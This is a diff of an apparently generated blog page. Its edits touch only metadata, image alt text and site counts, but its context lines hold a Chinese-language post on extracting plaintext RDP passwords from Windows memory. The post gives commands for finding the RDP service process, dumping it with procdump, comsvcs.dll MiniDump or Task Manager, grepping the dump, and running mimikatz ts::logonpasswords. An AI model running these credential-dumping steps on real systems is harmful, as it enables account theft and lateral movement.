@@ -94,7 +94,7 @@
 <meta property="og:image" content="https://assassins-white.github.io/img/21-12-16/image-20211216213334782.png">
 <meta property="og:image" content="https://assassins-white.github.io/img/21-12-16/image-20211216213354391.png">
 <meta property="article:published_time" content="2021-12-16T13:21:12.000Z">
-<meta property="article:modified_time" content="2021-12-16T13:45:49.380Z">
+<meta property="article:modified_time" content="2022-04-26T08:08:40.855Z">
 <meta property="article:author" content="Assassins 小白">
 <meta property="article:tag" content="RDP">
 <meta property="article:tag" content="提取明文">
@@ -355,28 +355,28 @@
 <li>有时能dump出密码，有时候dump不出来，不知道明文密码会在内存中存在多久</li>
 </ul>
 <h3 id="查找rdp连接"><a href="#查找rdp连接" class="headerlink" title="查找rdp连接"></a>查找rdp连接</h3><p>PowerShell：<code>netstat -nob | Select-String TermService -Context 1</code></p>
-<p><img src="../../../../img/21-12-16/image-20211216212922000.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216212922000.png" alt="Assassins小白"></p>
 <p>存在连接，运行下面这条命令，查找 <code>svchost.exe</code> 进程的 pid</p>
 <p><code>tasklist /M:rdpcorets.dll</code></p>
 <p>将显示加载 <code>rdpcorets</code> dll库的进程</p>
-<p><img src="../../../../img/21-12-16/image-20211216213010343.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213010343.png" alt="Assassins小白"></p>
 <h3 id="进程转储方式"><a href="#进程转储方式" class="headerlink" title="进程转储方式"></a>进程转储方式</h3><ul>
 <li><p>使用Process Hacker</p>
 </li>
 <li><p>使用任务管理器。右键单击该过程，然后选择 “创建转储文件”</p>
 </li>
 </ul>
-<p><img src="../../../../img/21-12-16/image-20211216213045500.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213045500.png" alt="Assassins小白"></p>
 <ul>
 <li>使用 Procdump</li>
 </ul>
 <p><code>procdump.exe -ma [PROCESS ID] -accepteula [FILE PATH]</code></p>
-<p><img src="../../../../img/21-12-16/image-20211216213109349.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213109349.png" alt="Assassins小白"></p>
 <ul>
 <li>使用 <code>comsvc.dll</code>（只在 PowerShell下测试成功）</li>
 </ul>
 <p><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 进程ID 1.dmp full</code></p>
-<p><img src="../../../../img/21-12-16/image-20211216213139180.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213139180.png" alt="Assassins小白"></p>
 <p>(<code>procdump</code>和<code>comsvcs</code>两种方式dump关键进程都会被杀软拦截)</p>
 <h3 id="翻密码"><a href="#翻密码" class="headerlink" title="翻密码"></a>翻密码</h3><p>进程转储出来后，就需要找到里面的明文密码了</p>
 <ul>
@@ -387,10 +387,10 @@
 <li>直接搜密码发现了(怎么精准定位到密码是个问题)</li>
 </ul>
 <p><code>strings -el 1.dmp | grep BBn12345ee -C3</code></p>
-<p><img src="../../../../img/21-12-16/image-20211216213334782.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213334782.png" alt="Assassins小白"></p>
 <h3 id="或，直接在目标机器执行mimikatz获取rdp明文密码"><a href="#或，直接在目标机器执行mimikatz获取rdp明文密码" class="headerlink" title="或，直接在目标机器执行mimikatz获取rdp明文密码"></a>或，直接在目标机器执行mimikatz获取rdp明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::sessions</span><br><span class="line">ts::logonpasswords</span><br></pre></td></tr></table></figure>
 
-<p><img src="../../../../img/21-12-16/image-20211216213354391.png"></p>
+<p><img src="../../../../img/21-12-16/image-20211216213354391.png" alt="Assassins小白"></p>
 
       
     </div>
@@ -516,7 +516,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -529,7 +529,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">85</span>
+                  <span class="site-state-item-count">87</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
